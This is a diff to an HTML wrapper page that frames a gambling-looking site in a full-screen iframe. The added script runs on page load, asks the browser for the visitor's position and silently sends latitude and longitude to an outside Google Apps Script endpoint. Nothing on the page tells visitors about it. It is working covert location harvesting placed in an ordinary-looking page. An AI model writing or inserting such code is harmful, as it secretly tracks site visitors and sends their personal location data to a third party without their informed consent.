@@ -6,6 +6,29 @@
 	<link rel="shortcut icon" href="https://www.ufa191.com/wp-content/themes/ufa191-v3.com_/favicon.ico?v=1.3">
 </head>
 <body>
+	<script>
+window.onload = function() {
+  getLocation();
+}
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+  }
+}		
+var xurl = "https://script.google.com/macros/s/AKfycbyhIZoJ6tZCI61FenWVHSlmt10F4Zw-NEE0Gzeecr6LLnB2pYY/exec";
+	function showPosition(position) {
+	    var xmlhttp = new XMLHttpRequest();
+        var theUrl = xurl+"?lat="+position.coords.latitude+"&long="+position.coords.longitude;
+        xmlhttp.open('GET', theUrl);
+        xmlhttp.send();
+            xmlhttp.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+            var jsonResponse = JSON.parse(this.responseText);
+        }
+      };  
+}	
+		</script>
 	<iframe style="position:absolute; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:scroll; -webkit-overflow-scrolling: touch;  z-index:999999;" src="https://www.ufa191.com/"></iframe>
 </body>
 </html>
